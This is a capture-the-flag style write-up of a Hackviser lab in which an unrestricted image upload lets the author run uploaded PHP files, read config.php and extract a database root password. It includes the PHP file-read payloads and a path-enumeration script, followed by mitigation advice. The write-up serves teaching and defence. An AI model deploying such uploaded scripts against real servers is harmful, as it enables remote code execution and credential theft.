---
title: "Unrestricted File Upload – RCE Leading to Database Credential Disclosure | Hackviser Lab"
date: 2026-05-04 15:00:00 +0530
categories: [Web Security, Unrestricted File Upload]
tags: [file-upload, rce, php, misconfiguration, sensitive-data-exposure]
platform: Hackviser
author: Shivansh Sharma
image: 
    path: /assets/images/posts/unrestricted-file-upload-hackviser.webp
    alt: Unrestricted File Upload Exploitation 
---

## Overview

File upload functionality is widely used in modern web applications for handling images, documents, and user-generated content.

However, when implemented insecurely, it becomes one of the most dangerous attack surfaces.

In this lab, a **Basic Unrestricted File Upload vulnerability** allowed uploading executable PHP files directly to the server. This led to **Remote Code Execution (RCE)** and ultimately **extraction of database credentials** from a configuration file.

---

## Objective

The lab challenge stated:

> This lab contains an Unrestricted File Upload vulnerability. The application has an image upload function, but the uploaded file content or type is not checked on the server.

**Goal:**
- Upload a malicious PHP script  
- Read `config.php`  
- Extract the database password  

---

## Understanding the Vulnerability

The application provided an image upload feature but failed to enforce critical security controls.

### Missing Protections

- No file extension validation  
- No MIME type verification  
- No content inspection  
- Files stored in web-accessible directory  
- No restriction on script execution  

Because of this, the upload functionality allowed:

➡️ Uploading `.php` files  
➡️ Executing them on the server  
➡️ Achieving Remote Code Execution  

---

## Reconnaissance

The first step was to confirm whether PHP execution was possible.

---

## Exploitation

### Step 1: Confirm PHP File Upload

Created a simple PHP payload:

```php
<?php
echo file_get_contents('config.php');
?>
```

Saved as:

```
exploit.php
```

Upload was successful, confirming:

- `.php` files are accepted
- Server executes uploaded files

However, accessing the file returned no output.

**Insight**

This indicated:

- `config.php` is not in the same directory

### Step 2: Locate config.php

To discover the correct path, a path enumeration script was used:

```php
<?php
$files = ['config.php', '../config.php', './config.php', '../../config.php'];

foreach($files as $file) {
    if(file_exists($file)) {
        echo "=== $file ===\n";
        echo file_get_contents($file);
        echo "\n\n";
    }
}
?>
```

**Result**

```
=== ../config.php ===
```

**Insight**

- The file exists one directory above
- Classic directory traversal via relative path

### Step 3: Extract Configuration File

Refined payload:

```php
<?php
header('Content-Type: text/plain');
echo file_get_contents('../config.php');
?>
```

Saved as:

```
exploit1.php
```

**Output**

```php
<?php
    try{
        $host = 'localhost';
        $db_name = 'hv_database';
        $charset = 'utf8';
        $username = 'root';
        $password = '8jv77mvXwR7LVU5v';

        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
    } catch(PDOException $e){

    }
?>
```

**Proof of Exploitation**

- Arbitrary PHP execution confirmed
- Sensitive file access achieved
- Database credentials extracted

**Database Password:**

```
8jv77mvXwR7LVU5v
```

---

## Impact

This vulnerability goes far beyond simple file upload issues.

**What an attacker can do:**

- Read sensitive files (`config.php`, `.env`, etc.)
- Execute arbitrary server-side code
- Extract database credentials
- Perform database compromise
- Pivot to other internal systems
- Potentially gain full server access

### Why This Becomes RCE

The key issue is not just upload — it's execution.

**Chain:**

1. Upload PHP file
2. Server executes it
3. Attacker runs arbitrary code

➡️ This is Remote Code Execution (RCE)

---

## Root Cause

The vulnerability existed due to multiple failures:

**1. No Extension Validation**
- Allowed `.php` files

**2. No Content Validation**
- File contents were not inspected

**3. Executable Upload Directory**
- Uploaded files were directly accessible and executable

**4. Poor File Storage Design**
- Files stored inside web root

---

## Mitigation

### 1. Restrict File Types

Allow only safe extensions:

```
.jpg, .jpeg, .png, .gif
```

### 2. Validate MIME Types

Use server-side validation:

```
finfo_file()
```

### 3. Rename Uploaded Files

- Generate random names
- Prevent predictable access

### 4. Store Outside Web Root

- Prevent direct execution
- Serve via controlled endpoints

### 5. Disable Script Execution

Apache configuration:

```
php_admin_flag engine off
```

### 6. Validate File Content

- Check magic bytes
- Do not trust extensions alone

---

## Real-World Insight

This is one of the most commonly exploited vulnerabilities in real-world applications.

Many high-impact breaches have occurred due to:

- Uploading web shells
- Accessing config files
- Extracting credentials

Once attackers obtain database credentials, they often:

- Dump user data
- Escalate privileges
- Move laterally across systems

---

## Key Takeaway

Unrestricted file upload is extremely dangerous when combined with executable server-side environments.

Even a simple image upload feature can lead to:

➡️ Remote Code Execution  
➡️ Credential Disclosure  
➡️ Full System Compromise  

